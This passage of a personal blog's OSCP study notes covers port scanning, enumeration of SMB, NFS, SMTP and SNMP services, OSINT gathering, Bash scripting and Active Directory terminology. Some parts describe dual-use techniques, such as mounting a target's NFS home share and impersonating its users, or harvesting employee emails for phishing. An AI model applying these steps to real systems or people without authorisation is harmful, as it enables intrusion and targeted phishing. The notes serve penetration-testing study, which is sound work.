acknowledges the first received packet. Finally, the client sends acknowledges the packet that the server sent with an ACK packet and the connection is established. This scanning technique considers the port open if the handshake is finished. The next picture summarizes the handshake protocol:We can do this with nectat by doing: nc -nvv -w 1 -z 1.1.1.1 1-99 where -w specifies a connection timeout (1 sec) and -z to specify that we don’t want to send any data. In this example we will only scan all the ports from 1 to 99.UDP ScanningUDP is stateless, this means that doesn’t ensure that the packets are correctly received because packets are not acknowledged. In this situation, a port may be open and receive the packet, but will send no answer back to the client. This will depend on how the application running on that port handles UDP packets. However, when a port is closed, by design, the response should be an ICMP packet with the port unreachable. However, if a port is filtered by a firewall, it’s difficult to know if the port is filtered or open.NmapIf we talk about tools, nmap is the best one. A default nmap scan will scan just the first 1000 ports, but we can scan all of them using the -p- option. Nmap has a huge amount of options an scan types and we are not going to define all of them here, just the most important. Stealth/SYN Scann: Is the default scanning technique. This scan sends the SYN packets, but doesn’t finish the full TCP handshake. If the port is open, the SYN-ACK packet will be received and the port will be marked as open. Since the TCP is not finished, the information is not passed to the application layer and will not appear in the application logs. This scan requires raw socket privileges (run nmap with sudo). TCP Connect Scann: This is the default scan used when nmap doesn’t have privileges. This technique has been described when talking about TCP scan previously. We can use the -sT option to tell nmap that we want to use this scan type. UDP Scann: As mentioned before, when doing UDP scans is difficult to know if a port is open or not. However, for de common ports used for known applications, nmap generates specific protocol packets to get a specific response. Nmap scans can generate a lot of traffic. If we want to scan large networks, we can first do a scan using the -sn option to do a host discovery first. Once we have the hosts that are up, then we can perform more aggresive scans against them scanning all their ports, detecting OS, using scripts, etc. I suggest to read the nmap manual page to know all options offered.SMB EnumerationServer Message Block (SMB) is a protocol that due to its complex implementation it has security problems. SMB is a client/server protocol that allows access to shared files, directories and other resources such as printers, routers, etc. This protocol uses the port 445 and the TCP protocol.NetBIOS ServiceNetBios is a network protocol that allows distributed applications to access each other’s network services. This protocol runs on port 139 and is independent from the SMB protocol. Modern implementations of SMB can work without NetBIOS, but both protocols are often enabled together.We can use nmap to scan a host and detect this service: nmap -v -p 139,445 1.1.1.1There are other tools to identify NetBIOS information such as nbtscanNmap SMB NSE ScriptsWe mentioned that nmap is a super powerful tool. It has scripts that can help us to enum different services better such as SMB. The scripts are in /usr/share/nmap/scripts directory:❯ ls -l /usr/share/nmap/scripts/smb*.rw-r--r-- root root 44 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-brute.nse.rw-r--r-- root root 5.2 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse.rw-r--r-- root root 4.7 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-enum-domains.nse.rw-r--r-- root root 5.8 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-enum-groups.nse.rw-r--r-- root root 7.9 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-enum-processes.nse.rw-r--r-- root root 27 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-enum-services.nse.rw-r--r-- root root 12 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-enum-sessions.nse.rw-r--r-- root root 6.8 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-enum-shares.nse.rw-r--r-- root root 12 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-enum-users.nse.rw-r--r-- root root 1.7 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-flood.nse.rw-r--r-- root root 7.3 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-ls.nse.rw-r--r-- root root 8.6 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-mbenum.nse.rw-r--r-- root root 8.0 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-os-discovery.nse.rw-r--r-- root root 4.9 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-print-text.nse.rw-r--r-- root root 1.8 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-protocols.nse.rw-r--r-- root root 62 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-psexec.nse.rw-r--r-- root root 5.1 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-security-mode.nse.rw-r--r-- root root 2.4 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-server-stats.nse.rw-r--r-- root root 14 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-system-info.nse.rw-r--r-- root root 7.3 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-vuln-conficker.nse.rw-r--r-- root root 23 KB Sun Aug 8 19:40:33 2021  /usr/share/nmap/scripts/smb-vuln-cve-2017-7494.nse...We can use these scripts while running nmap with the --script option: nmap -v -p 139,445 --script=smb-os-discovery 1.1.1.1. In this example the script will try to identify the OS. We can make use of different scripts to check for known vulnerabilities or exploits.NFS EnumerationNetwork File System (NFS) is a distributed file system protocol. While SMB is often used on Windows OS, NFS is mostly used on Unix OS. This protocol is not secure by design and it can lead to sensitive information exposure.NFS is an RPC service (Remote Procedure Call), so in order to serve the service to the clients, it makes use of portmapper and rpcbind. Portmapper maps RPC services to the ports they are listening on. When the client wants to use an RPC service, it contacts with the portmapper with the program number and then, portmapper redirects the client to the proper port number (where the requested program is running). Portmapper runs on port 111.Like SMB, we can enumerate this service using nmap with some scripts like rpcinfo, which will find the registered RPC services: nmap -sV -p 111 --script=rpcinfo 1.1.1.1.Nmap NFS NSE ScriptsOnce we have detected NFS running on that host, we can use the NFS scripts that nmap has to collect additional information such as directories that can be mounted.Let’s imagine that after running nmap -p 111 --script nfs* 1.1.1.1 we see that the \\home directory can be mounted in our system. Then we can use the mount command to do it (and the -o nolock option to disable file locking).❯ mkdir external_home❯ sudo mount -o nolock 1.1.1.1:/home ~/external_home/❯ cd external_home❯ lsvictim1 victim2 victim3The victim1, victim2, victim3 home directories are users from the victim machine and they are mounted on our system now. However, maybe we won’t have permission to access them because of the users needed. However, we can check the permissions with ls -la and see which users are able to access them. Then, we can create this users using the adduser command in our machine and do a su to that user. Then we will have an “imitation” of that user in our machine and we will be able to access these files/directories.SMTP EnumerationThe Simple Mail Transport Protocol (SMTP) supports several commands that can give us interesting information. A VRFY request asks the server to verify an email address. The EXPN asks the server for the membership of a mailing list. Both commands can be used to search for existing users on a mail server.SNMP EnnumerationThe Simple Network Management Protocol (SNMP) can be misconfigured and abused by attackers. It runs on port 161 Since it uses UDP, is vulnerable to IP spoofing and replay attacks. Some of its protocols send unencrypted data and they have weak authentication schemes.SNMP MIB TreeThe SNMP Management Information Base (MIB) is a database that contains information about the network management. This DB is represented like a tree, where branches are different organizations or functions and leaves are specific variable values.     1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports Scanning for SNMPSince SNMP uses UDP, if we use nmap we have to use the -sU option to do a UDP scan. Alternatively, we can use a tool like onesixtyone bit it will need to build text files containing community strings. A community string is like an ID that allows access to resources.Once we have identified an SNMP service, we can start doing queries to extract data.Windows SNMP EnnumerationWe can use the snmpwalk tool to query for data. We have to provide a community string. The community string for read-only data is public in most cases.By doing snmpwalk -c public -v1 -t 10 1.1.1.1 we can enumerate all the MIB tree. However, if we want to get a specific value, such as user accounts, then we have to use the number related to this resource (specified in the previous table): snmpwalk -c public -v1 -t 10 1.1.1.1 1.3.6.1.4.1.77.1.2.25." }, { "title": "OSCP-6: Passive Information Gathering", "url": "/posts/OSCP-6/", "categories": "OSCP-Study-Guide", "tags": "OSCP", "date": "2022-07-19 08:10:00 +0200", "snippet": "Chapter 6: Passive Information GatheringDepending on the pentest that you are doing, the first step may be gathering openly available information about the target without directly interacting with it. This is also known as OSINT: Open-Source Intelligence. In this post several tools and technologies that can help us to gather information about the victim will be discussed.Taking NotesWe may find a lot of information, so it is important to organize everything correctly and take notes that can help you to identify important data or remember something that you though but didn’t have time to try.Website ReconIf the victim has a website, the first thing we must do is browse it and inspect the target. Some websites give sensitive information like email addresses of their employees, names, etc. We can use this information to gather more information about the people working on that company, if the email addresses follow a pattern an can be guessable, etc.Whois EnumerationThe whois command can give us information about a domain by just using that domain name as an argument. Let’s make an example with google.com:❯ whois google.com Domain Name: GOOGLE.COM Registry Domain ID: 2138514_DOMAIN_COM-VRSN Registrar WHOIS Server: whois.markmonitor.com Registrar URL: http://www.markmonitor.com Updated Date: 2019-09-09T15:39:04Z Creation Date: 1997-09-15T04:00:00Z Registry Expiry Date: 2028-09-14T04:00:00Z Registrar: MarkMonitor Inc. Registrar IANA ID: 292 Registrar Abuse Contact Email: abusecomplaints@markmonitor.com Registrar Abuse Contact Phone: +1.2086851750 Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited Name Server: NS1.GOOGLE.COM Name Server: NS2.GOOGLE.COM Name Server: NS3.GOOGLE.COM Name Server: NS4.GOOGLE.COM DNSSEC: unsigned URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/&gt;&gt;&gt; Last update of whois database: 2022-07-19T08:45:39Z &lt;&lt;&lt;...Google Hacking/DorkingGoogle has an incredible search engine that if used correctly can help you to obtain information that was not meant to be public but it is due to misconfigurations. This methodology consists in using search strings and operators: site: This operator limits the searches to the domain that you specify. For example, if we want some official information related to faceboo.com, we want to avoid some randomsite.com talking about facebook. filetype/ext: This operator specifies the type of document that we want. If we put a - before the operator, all the files matching that operator will be excluded from the search. intitle: This operator specifies a text that has to be in the titleThere are a lot of operators, you can find a list of them here. Moreover, in the ExploitDB you can find useful search queries already written.NetcraftNetcraft is a company that offers a free web portal that performs information gathering, for example information about the domain (https://searchdns.netcraft.com/). When you search for a domain it also provides you with a site report that gives a lot of information like the technologies being used.Recon-ngRecon-ng is a module-based framework tool that performs web-based information gathering. It also has a database so the results of one module can feed another module and expand the scope. When we first install the framework, we have no modules installed. We can use the marketplace search to add modules. Some modules require an API key. You can also use the marketplace info to obtain more details and the marketplace install to add a module. Once a module is installed, we can use module load followed by the module name and then info to know the required parameters. You can set the parameters using options set command and finally run the module using runYou can find more information about how to use it here.Open-Source CodeIf we are talking about open-source projects, being able to read de code can give us a lot of information about the application and potential vulnerabilities and exploits. It is also possible to use the google dorking thechniques explained previously in other search bars, like Github and we can use to retrieve data that was not supposed to be public, but it is, like testing files, files with temporal passwords, etc. There are tools that do this like Gitrob and Gitleaks.ShodanShodan is a search engine that analyzes devices connected to the internet, but not just web applications. It gives us information about open ports and services running, published vulnerabilities, etc. It is like using nmap but without getting our hands dirty and being detected.Security Headers ScannerSecurity Headers is a site that analyzes the HTTP response headers to detect some security misconfigurations (There are several HTTP headers that protect the website from known attacks).SSL Server TestThe SSL Server Test is a site that analyzes the implementation of SSL/TLS and it detects potential vulnerabilities, like using an outdated cipher.PastebinPastebin is a website for sharing text and store it. It is a public service and it doesn’t require a user account. It is worth to take a look at it.User Information GatheringInstead of obtaining information about domains and sites, we can also gather information about users. Email Harvesting: This technique consists of obtaining real user e-mails that can be used in phishing campaigns. theHarvester is a tool that gathers a lot of information related to a domain, included e-mails. Password Dumps: Some hackers that have dumped databases usually post the data at some public sites like Pastebin. These dumps are used to create Wordlists, like rockyou, which contains most used passwords.Social Media ToolsTwofi is a tool that scans a user’s Tiwtter feed and creates a specific wordlist for that user. This tool requires a Twitter API key.linkedin2username is a script that generates username lists based on LikedIn data about a company.Stack OverflowWe can obtain interesting information if we analyze what kind of questions a user is doing at Stack Overflow, for example questions related to patching some vulnerabilities, etc.Information Gathering FrameworksThe OSINT Framework collects a huge amount of tools and categories that you can use in order to obtain information about the client.Maltego is an extremely powerful data mining tool, but the community version requires an account. It displays information in a graph structure that allows easy reading and navigation." }, { "title": "OSCP-5: Bash Scripting", "url": "/posts/OSCP-5/", "categories": "OSCP-Study-Guide", "tags": "OSCP Bash", "date": "2022-07-16 08:10:00 +0200", "snippet": "Chapter 5: Bash ScriptingLearning to write scripts in Bash is really important for automatizing tasks. A Bash Script is a file that contains commands and they will be executed as if they had been typed directly at a terminal prompt.A bash script starts with #!/bin/bash: #!: This is the shebang, it is ignored by the Bash interpreter but when the file is used as an executable, the loader executes the specified interpreter passing the contents as an argument. /bin/bash: This is the absolute path to the interpreter that will run the script.Then we would add all the bash commands that we want to execute.VariablesI won’t get into much detail about what is a variable since if you have basic programming knowledge you know what’s their usage. When using Bash, a variable can be declared in different ways, but the easier way is using the = sign, for example:❯ variable=TESTIt’s important to mention that there are not any spaces between the sign.When we want to reference (expand) a variable we need to precede the name of the variable with the $ sign:❯ echo variablevariable❯ echo $variableTESTIf we want to declare variables in a multi-value way, we need to enclose the content using single quotes (') or double quotes (\"). However, Bash treats them differently: Single quotes: All characters are interpreted literally. Double Quotes: All characters are interpreted literally except from $, ` and \\, meaning that we can expand variables when declaring another variable. In the next example we can see the difference: ❯ test=World❯ single='Hello $test'❯ echo $singleHello $test❯ double=\"Hello $test\"❯ echo $doubleHello World Another interesting thing that we can do is to assing to a variable the output of another command. To do this we need to use parentheses (()) preceded by a $. Alternatively we can use `. This changes are made in a subshell, so they won’t change the values in the master process unles we directly assign them. ❯ test=$(whoami)❯ echo $testadri❯ $(test=changed)❯ echo $testadri ArgumentsWhen creating a script, you can work with arguments passed when the script is executed. Inside the script we can use several variables that can be really useful: Variable Name Description $0 The name of the Bash script $1-$9 The first 9 arguments passed to the Bash script $# Number of arguments passed to the Bash script $@ All arguments passed to the Bash script $? The exit status of the last executed run process $$ The process ID of the current script $USER The username of the user running the script $HOSTNAME The hostname of the machine $RANDOM A random number $LINENO The current line number in the script Interactive User InputWe can read input that the user provide in an interactive way. To do this, we will use the read command. The read input can be used along with the -p and -s options. The first one allows you to specify a prompt and the last one makes the input silent (useful for passwords).❯ cat test.sh───────┬───────────────────────────────────────────────────────────────── │ File: test.sh───────┼───────────────────────────────────────────────────────────────── 1 │ #!/bin/bash 2 │ 3 │ echo \"Hello, please enter the username and password\" 4 │ 5 │ read -p \"Username: \" usname 6 │ read -sp \"Password: \" password 7 │ 8 │ echo -e \"\\nHello $usname with this password: $password\" 9 │ 10 │ ───────┴─────────────────────────────────────────────────────────────────❯ ./test.shHello, please enter the username and passwordUsername: AdriPassword: Hello Adri with this password: SuperSecretIf, Else, ElifWhen doing bash scripts we can also use conditionals.The if statement is easy to understand, but it has a specific syntax:if [ &lt;evaluation&gt; ]then &lt;tasks to perform&gt;fiIf the evaluation is true, then the script will execute the tasks to perform between the then and fi.The square brackets ([ ]) in the if statement are a reference to the test command, so we can use operators allowed by this command: Operator Expression True if… !EXPRESSION The EXPRESSION is false. -n STRING STRING length is greater than zero -z STRING The length of STRING is zero (empty) STRING1 != STRING2 STRING1 is not equal to STRING2 STRING1 = STRING2 STRING1 is equal to STRING2 INTEGER1 -eq INTEGER2 INTEGER1 is equal to INTEGER2 INTEGER1 -ne INTEGER2 INTEGER1 is not equal to INTEGER2 INTEGER1 -gt INTEGER2 INTEGER1 is greater than INTEGER2 INTEGER1 -lt INTEGER2 INTEGER1 is less than INTEGER2 INTEGER1 -ge INTEGER2 INTEGER1 is greater than or equal to INTEGER 2 INTEGER1 -le INTEGER2 INTEGER1 is less than or equal to INTEGER 2 -d FILE FILE exists and is a directory -e FILE FILE exists -r FILE FILE exists and has read permission -s FILE FILE exists and it is not empty -w FILE FILE exists and has write permission -x FILE FILE exists and has execute permission We can also define a set of actions to be executed whrn the statement is false using else:if [ &lt;test&gt; ]then &lt;actions to do when true&gt;else &lt;actions to do when false&gt;fiThe if and else statements only allow two code execution branches. We can add additionalbranches with the elif statement.if [ &lt;test&gt; ]then &lt;actions to do when true&gt;elif [ &lt;another test&gt; ]then &lt;actions to do when 2nd test is true&gt;else &lt;actions to do when both tests are false&gt;fiBoolean and Logical OperationsThe AND (&amp;&amp;) operator executes a command only if the previous one succeeds, returns true or 0. The OR (||) operator executes a command only if the previous one fails, returns false or none 0.In the next example we can see a usage of them:❯ echo $usertestadritest❯ grep $usertest /etc/passwd &amp;&amp; echo \"$usertest exists!\" || echo \"$usertest\" doesn't exist!\"adritest doesn't exist!This opperators can also be used in a test to compare values or test results. When using them like this, AND is true when both conditions are true. However, OR is true when at least one is true.LoopsWe can create loops using for or while.ForThe syntax of a for loop looks like this:for variable in &lt;list&gt;do &lt;actions to perform&gt;doneThe loop will iterate over the list and in each iteration it will assign the item to the variable and then perform the actions defined between the do and done. It will do this until the list is exhausted. We can create a list doing another command inside the parentheses preceded by the $, reading files, using brace expansion ({1..10}), etc.:❯ for iter in $(seq 1 5); do echo $iter; done12345❯ for iter in {1..5}; do echo $iter; done12345WhileWhile loops execute some actions while the expression is true. They use the square brackets ([]) for the tests.while [ &lt;test&gt; ]do &lt;action to perform&gt;doneIn order to do the same example we used for the for loops, we need to define a counter variable. We are going to use the double parenthesis (( )) to perform an arithmetic expansion and evaluation at the same time:❯ cat test.sh───────┬───────────────────────────────────────────────────────────────── │ File: test.sh───────┼───────────────────────────────────────────────────────────────── 1 │ #!/bin/bash 2 │ 3 │ counter=1 4 │ 5 │ while [ $counter -le 5 ] 6 │ do 7 │ echo $counter 8 │ ((counter++)) 9 │ done 10 │ ───────┴─────────────────────────────────────────────────────────────────❯ ./test.sh12345FunctionsLast but not least, we can also define functions inside bash scripts. They are useful when we want to perform the same action multiple times. They may be written in two different formats:function function_name {&lt;actions to perform&gt;}function_name() {&lt;actions to perform&gt;}As in other programming languages, functions can accept arguments, however, we don’t need to define them (we can access to them using the $1, $2… variables. Let’s create an example:❯ cat test.sh───────┬───────────────────────────────────────────────────────────────── │ File: test.sh───────┼───────────────────────────────────────────────────────────────── 1 │ #!/bin/bash 2 │ 3 │ function_with_args() { 4 │ echo \"The argument passed to this function is $1\" 5 │ } 6 │ 7 │ function_with_args 1111 8 │ ───────┴─────────────────────────────────────────────────────────────────❯ ./test.shThe argument passed to this function is 1111Bash functions can also return values. They return an exit status (0 for success and non-zero for failure) and they can return an arbitary value using the $? global variable. However, we can set global variables in order to simulate a traditional return.❯ cat test.sh───────┬───────────────────────────────────────────────────────────────── │ File: test.sh───────┼───────────────────────────────────────────────────────────────── 1 │ #!/bin/bash 2 │ 3 │ i_love_24() { 4 │ return 24 5 │ } 6 │ 7 │ i_love_24 8 │ echo \"Wow, the previous function returned $?, unexpected!\"───────┴─────────────────────────────────────────────────────────────────❯ ./test.shWow, the previous function returned 24, unexpected!A global variable can be accessed everywhere in the code, however a local variable can only be seen within the function, block of code or subshell. It is possible to overlay a global variable by re-declaring it preceded with local keyword, leaving the global variable untouched:❯ cat test.sh───────┬───────────────────────────────────────────────────────────────── │ File: test.sh───────┼───────────────────────────────────────────────────────────────── 1 │ #!/bin/bash 2 │ name=\"Adri\" 3 │ test() { 4 │ local name=\"Local Adri\" 5 │ echo \"The name inside the function is: $name\" 6 │ } 7 │ test 8 │ echo \"The name outside the function is: $name\"───────┴─────────────────────────────────────────────────────────────────❯ ./test.shThe name inside the function is: Local AdriThe name outside the function is: Adri" }, { "title": "OSCP-Starting Point", "url": "/posts/OSCP-Starting/", "categories": "OSCP-Study-Guide", "tags": "OSCP", "date": "2022-07-16 08:10:00 +0200", "snippet": "OSCP STUDY WALKTHROUGHEdit: I was studying for the OSCP but I started a new job as a Security Analyst. Since this certification requires a lot of study and time, I decided to stop and invest that time in other certifications more related with my job role. I won’t remove the posts because I think that in a future I would like to keep learning about ofensive security.Before creating this blog, I already started taking notes using LaTex :) but since it was consuming a lot of time, I decided to continue using md language. That’s the reason why the content of the posts won’t start in Chapter 1 (Introduction to Kali Linux), but they start in Chapter 5 (Bash Scripting).Let’s Go!" }, { "title": "Active Directory Basics", "url": "/posts/active-directory/", "categories": "Theory", "tags": "Windows, Active_Directory, Basics", "date": "2022-06-21 03:47:00 +0200", "snippet": " The contents of this post are based on my understanding about the topic obtained while doing this module from HTB Academy. If you detect something wrong, confusing or conflicting, please let me know.During my university degree I haven’t been able to learn anything related to Windows nor Active Directory (AD). However, almost all the organitzations use Windows systems, so learning how to deal with this workstations is a must if you want to do anything related with cybersecurity. For this reason, I put my hands to work as soon as possible and started to learn how Active Directory works. In this post you will find all the basic concepts that can help you build a solid knowledge about AD.What is AD?Active Directory is a hierarchical structure that allows a centralized management of the organitzation. It has several services like domain services, file shares, group policies, and network devices management. It can be seen as a Read-Only database accessible to all users within the domain, regardless of their privilege level. This means that any user can enumerate most information about the AD and search for misconfigurations to exploit.A user account without privileges can enumerate:     Domain Computers Domain Users Domain Group information Organizational Units (OUs) Default DOmain Policy Functional Domain Levels Password Policy Group Policy Objects (GPOs) Domain Trusts Access Control Lists (ACLs) Consequently, there are a lot of vulnerabilities and exploiting tools that can vulnerate a whole AD environment.TerminologyThroughout this post I’m going to use some terminologies that will be defined in this section: Object ANY resurce present within an Active Directory environment. Attributes Objects inside AD have associated attributes that define that object. For example, a computer contains attributes such as hostname and DNS name. All attributes have an associated LDAP name that can be used when performing LDAP queries. Schema The AD schema defines the objects that can exist inside the AD and their attributes and stores information about them. Domain Logical group of objects. They can be independent or connected to other domains with trust relationships. Forest Is a collection of domains. It can also have trust relationships with other forests. Tree A tree is the collection of subdomains that begins at a single root domain. A forest can have different trees. All domains in a tree share a standar Global Catalog which contains all information about the objects within that tree. Container Is a type of object that contains other objects in a defined place within the directory hierarchy. Leaf Leafs objects don’t contain other objects Global Unique Identifier (GUID) This identifier is a 128-bit value assigned when a domain user/group is created. This identifier is stored in the ObjectGUID attribute. This value never changes. Every single object has a GUID. Security principals Anything that the operating system can authenticate (not only users or accounts, but threads and processes too). In AD, security principles are the objects used to manage access to other resources. If we want to control resources localy inside a computer, it’s not a AD task but a Security Accounts Manager (SAM) task. Security Identifier (SID) This identifier is used for a security principal or group. Every account, group or process has its unique SID. SIDs are immutable and unique. For example, a security principal name can change but the SID will remain the same. They are used to grant access and check rights. There are well-wnown SIDs. Distinguished Name (DN) A DN describes the full path to an object inside the AD environment. Relative Distinguished Name Is a single component of the DN that identifies the object as unique inside the current level in the naming hiererchy. It is like you can’t hafe two files with the same name in the same directory, but you can have them in diferent directories, where the directory in this example maps to the hierarchy level within the AD, and the filename maps to the object. sAMAccountName It is the user logon name. It has to be a unique value with &lt;= 20 characters. userPrincipalName This attribute is another way to identify users in AD (not mandatory). It has a prefix which is the user account name and a suffix which is the domain name, both separated with “@”. FSMO Roles Flexible Single Master Operation roles (FSMO) allows a DC to have specific responsabilities. They are usefull when there are several DC within the domain. There are five FMOS: Schema Master: This role manages the read/write copy of the AD schema. Only one per forest. Domain Naming Master: Manages the domain names.Only one per forest. Relative ID (RID) Master: Assigns blocks of RIDs to other DC within the domain that can be used for new objects. It ensures that multiple objects doesn’t have the same SID. A domain object SID is equal to the domain SID + RID. Only one per domain. Primary Domain Controller (PDC) Emulator: The host with this role will be the authoritative DC and responds to authentication requests, password changes and manage GPOs. It also mantains time for a domain.Only one per domain. Infrastructure Master: Translates GUIDs, SIDs and DNs between domains. Used whenever there are multiple domains within a forest. Only one per domain. The five roles are assigned to the first DC in the forest root domain. When a new domain is created, RID Master, PDC Emulator and Infrastructure Master roles are assigned to the new domain controller. Global CatalogA GC is a domain controller that has copies of ALL objects in the AD forest (Full copy of the objects belonging to the same domain and partial copy of the ones from other domains). It can perform authentication and object search. Read Only Domain Controller (RODC) Is a DC that has a Read-Only Active Directory database. They also include a Read Only DNS server. Replication Is a concept that happens in AD when objects are updated ant the changes are transfered from one Domain Controller to another. Connections between DC that allow this replication are made by the Knowledge Consistency Checker service. Service Principal Name (SPN) A SPN uniquely identifies a service instance. Kerberos protocol uses them to associate a service with a logon account, allowing the client application to request the service without needing the account name. Group Policy Object GPO are collections of policy settings. Each one has a GUID that identifies the GPO. It can contain a local file system settings or Active Directory settings that can be applied to users and computer objects. Access Control List (ACL) An ACL is the ordered collection of Access Control Entities (ACEs) that apply to an object. Access Control Entities (ACEs) An ACE in a ACL identifies a trustee (user account, group account, or logon session) and lists all the rights and permisions that are allowed, denied or audited for that *trusteee Discretional Access Control List (DACL) A DACL defines security principles to an object. It contains a list of ACE. If an object doesn’t have a DACL, the system will grant full acces to everyone, but if the DACL exists and it has no ACE, all access will be denied. System Access Control Lists (SACL) They permit the logging (security logs) the access attempts made to a secured object. Fully Qualified Domain Name (FQDN) Is the complete name for a specific computer or host. It is composed with: [hostname].[domain name].[tld]. It can be used to specify an object’s location within the tree hierarchy. It allows to reference hosts without knowing their IP. For example the host PC01 may have a FQDN like PC01.EXAMPLECOMPANY.LOCAL. Tombstone It is a container object that holds deleted AD objects. Microsoft recomends a tmbstome lifetime of 180 days. When a object enters the Tombstone container, it looses most of its attributes. AD Recycle Bin If the AD Recycle Bin is enabled, all deleted objects are preserved facilitating the restoration because almost all the attributes are preserved. SYSVOL This folder stores copies of public files in the domain (system policies, GPO settings, logon/logoff scripts, etc..) AdminSDHolder This object is used to manage ACL for the members of the built-in groups in AD marked as privileged. It has a Security Descriptor that defines the ACLs that members of the protected groups should have. There is a SDProp (SD Propagator) that runs each hour and checks if all the users have the desired ACL. dsHeuristics This attribute is a string value set on the Directory Service object and helps to define forest-wide configuration settings. One of this settings is to exclude built-in groups from the Protected Groups list. This will make that when the SDProp is executed, if any changes have been made to that object, they won’t be reverted. adminCount This attribute determines whether the SDProp protects a user. If its 0 or non defined, the user won’t be protected, if it is “value”, the user will be prottected. If the value is 1 means that the account may be privileged. Active Directory Users and Computers (ADUC) ADUC is a GUI used to manage users, groups, computers and contacts within the AD. ASDI Edit It’s also a GUI tool that can manage objects in the AD. It provides more acces than ADUC and it allows to set and delete attributes on an object. sIDHistory This attribute holds previous SIDs that the object was assigned previously. It can be abused allowing an attacker to gain previous privileges that an account had if SID Filtering is not enabled. NTDS.DIT This file is the “heart” of the AD. It is stored on a Domain Controller (C:\\Windows\\NTDS) and is a database. It contains information about user groups and group objects, group membership and password hashes for all users of the domain. Moreover, if the setting Store password with reversible encryption is enabled, the file will also contain the passwords in cleartext (that have been changed or created after the setting was enabled). AD StructureAD follows a hierarchical tree structure. At the top of this structure we can find the forest, which contains one or more domains that can also contain more subdomains. A forest is the top logical container. “Best Practices” dictate that having a single forest is the simpler and best long-term solution; however, having a mult-forest organitzation can provide an extra layer of security across different domains since a forest is the security boundary within which all objects are under administrative control. Is it possible to create trust relationships between two forests that link them, but it can introduce several security issues if they are not administered propperly. Bidirectional trust between two root domains doesn’t imply that subdomains also have this biderectional trust. Trusts can be transitive or not transitive: Transitive: A transitive trust means that the trust will be extended to objects that the child domain also trust. Non-Transitive: Only the child domain will keep the trust.They can be one-way or two-way (bidirectional). In a bidirectional trust users from both domains can acces resources. However, in a one-way trust, only users in a trusted domain can acces the resources in a trusting domain. The direction of the trust is opposite to the direcction of accessThere are several trusts types: Parent-child: Domains within the same forest. The child domain has a two-way transitive trust with the parent domain. Cross-link: A trust between child domains to speed up authentication. External: This is a non-transitive trust. Its between two separate domains in separate forests that are not related by a forest trust. It uses SID filtering. Tree-root: Two-way transitive trust between a forest root domain and a new tree domain. They are created by design, Forest: Transitive trust between two forest root domains.A domain is a structure that cintains objects like users, computers and groups. It has built-in Organizational Units (OUs) such as Domain Controllers, Users and Computers but new OUs can be created. sub-OUs can be created to assign different privileges/group policies. Active Directory provides authorization and authentication within elements inside the same domain.Let’s see a basic structure example:EXAMPLECOMPANY.LOCAL/|--ADMIN.EXAMPLECOMPANY.LOCAL| |-- GPOs| |-- OU| |-- EMPLOYEES| \t |-- COMPUTERS| | |-- PCO1|\t ||\t |-- GROUPS|\t | |-- HQ STAFF| || \t |-- USERS| |-- adria.pages||-- CORP.EXAMPLECOMPANY.LOCALIn the previous example we only have one forest with one domain named EXAMPLECOMPANY.LOCAL (the root domain). This root domain has two subdomains named ADMIN.EXAMPLECOMPANY.LOCAL and CORP.EXAMPLECOMPANY.LOCAL. EMPLOYEES is a OU inside a subdomain and it has several sub-OUs like COMPUTERS, GROUPS, USERS etc.Active Directory ObjectsAs mentionet in the “Therminology Section” an Object is any resource present in the AD (Domains, OU, Computers, Groups, Users and Printers and more).UsersUsers are leaf objects (they can’t contain more objects inside them). It is considered a security principal and has a SID and GUID. They have several attributes like name, email address, account description, last login time, and much more.ContactsA contact object represents an external user. They are not security principals (securable objects) so they don’t have SID but they have GUID. They have attributes like name, lstname, email address, etc.PrintersThis object points to a printer accessible within the AD network. It’s not a security principal so they only have a GUID. They have attributes like printer name, drivers information, port number, etc.ComputersA computer is also a leaf object but they are security principals. They are one of the main targets for the attackers.Shared FoldersThis object points to a shared folder on the specific computer. Acces control can be applied to them to restrict the acces only to authenticated users. They are not a security principal so they only have a GUID.GroupA group is a container object because it contains other objects such as objects and computers (even other groups). Groups are security principals and have a SID and a GUID. Groups makes the management of user permisions and acces to other securable objects much more easy. Nested groups can lead to users having unintended rights because they obtain permisions of all the grups where they participate. The tool BloodHound discovers attacks paths analyzing the AD and its permisions. It has seveal attributes like name, description, membership, etc.Organizational Units (OUs)They are containers that sysadmins use to store similar objects in order to make them easier to administrate. They are often used for administrative delegation of tasks without granting a user full administrative rights. Usually, OUs are used to manage Group Policy.DomainDomains contain 